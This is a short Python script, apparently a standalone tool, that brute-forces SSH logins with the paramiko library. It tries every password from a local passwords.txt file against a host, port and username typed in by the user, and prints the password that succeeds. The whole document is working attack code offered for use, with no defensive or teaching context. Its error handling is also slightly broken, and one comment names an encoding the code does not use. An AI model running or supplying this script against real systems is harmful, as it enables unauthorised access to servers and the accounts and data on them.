import os
import paramiko

def ssh_password_crack(target_host, target_port, username, password_list):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for password in password_list:
        try:
            ssh.connect(target_host, port=target_port, username=username, password=password)
            print(f"Password cracked: {password}")
            ssh.close()
            break
        except paramiko.AuthenticationException:
            print(f"Failed attempt: {password}")

# Example usage
if __name__ == "__main__":
    target_host = input("Enter the target SSH host: ")
    target_port = int(input("Enter the SSH port: "))
    username = input("Enter the SSH username: ")

    # Get the current script directory
    current_directory = os.path.dirname(os.path.abspath(__file__))
    password_file_path = os.path.join(current_directory, 'passwords.txt')

    try:
        # Open the 'passwords.txt' file in the current directory with 'utf-8-sig' encoding
        with open(password_file_path, 'r', encoding='utf-8') as file:
            password_list = [line.strip() for line in file.readlines()]
    except UnicodeDecodeError:
        print("Error: Invalid characters in the file.")
        # Handle the error, for example, by skipping the problematic line or logging the issue.

    ssh_password_crack(target_host, target_port, username, password_list)
